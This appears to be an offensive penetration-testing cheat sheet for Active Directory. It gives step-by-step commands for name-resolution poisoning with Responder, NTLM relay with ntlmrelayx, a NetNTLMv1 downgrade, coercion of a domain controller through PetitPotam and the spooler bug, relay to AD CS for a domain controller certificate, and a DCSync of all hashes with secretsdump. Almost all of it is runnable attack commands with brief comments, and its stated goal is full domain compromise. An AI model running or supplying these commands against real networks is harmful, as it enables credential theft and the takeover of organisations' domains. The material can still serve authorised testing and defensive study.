Poisoning & relay — Responder / ntlmrelayx
++++++++++++++++++++++++++++++++++++++++
# Find relay targets first: hosts where SMB signing is NOT required.
nxc smb <ip_address>/24 --gen-relay-list relaytargets.txt
# Poison LLMNR/NBT-NS/mDNS and capture NetNTLMv2 to crack offline:
sudo responder -I <iface>
# Downgrade to NetNTLMv1 (shuckable straight to an NT hash — see next fold):
sudo responder -I <iface> --disable-ess --lm
# RELAY instead of crack: turn Responder's OWN SMB+HTTP servers OFF first
# (SMB = Off, HTTP = Off in Responder.conf — /etc/responder/ or /usr/share/responder/), then:
impacket-ntlmrelayx -tf relaytargets.txt -smb2support              # relay in, dump SAM
impacket-ntlmrelayx -t smb://<ip_address> -smb2support -socks      # -socks keeps the session
proxychains nxc smb <ip_address>                                   # ride the relayed session
# A relayed logon is one where the source workstation != the account's own host.
////////////////////////////////////////


Coercion -> relay -> domain compromise
++++++++++++++++++++++++++++++++++++++++
# Force a machine (ideally a DC) to authenticate to you, then relay that auth.
impacket-petitpotam <your-ip> <dc-ip>                       # MS-EFSRPC (EfsRpcOpenFileRaw)
printerbug.py <domain>/<user>:<password>@<dc-ip> <your-ip>  # MS-RPRN spooler (a.k.a. Dementor)
coercer coerce -t <dc-ip> -l <your-ip> -u <user> -p <password> -d <domain>   # many vectors
# Relay the coerced DC auth to AD CS web enrollment (dirkjanm relay-to-ADCS) -> DC cert:
impacket-ntlmrelayx -t http://<ca-host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Turn that DC cert into the DC's NT hash via PKINIT, then DCSync:
python3 gettgtpkinit.py -cert-pem dc.crt -key-pem dc.key -dc-ip <dc-ip> <domain>/'DC$' dc.ccache
KRB5CCNAME=dc.ccache python3 getnthash.py -k <AS-REP-key> -dc-ip <dc-ip> <domain>/'DC$'
impacket-secretsdump -hashes :<NThash> <domain>/'DC$'@<dc-ip>

# NetNTLMv1 is fatal: a captured v1 response downgrades to the NT hash directly.
#   crack.sh / shuck.sh (shuck.sh/get-shucking.php) "shuck" NetNTLMv1 -> NT hash.
#   ref: trustedsec.com/blog/practical-attacks-against-ntlmv1
nxc smb <ip_address> -u '<host>$' -H <NThash> -d <domain>   # then auth as the machine acct
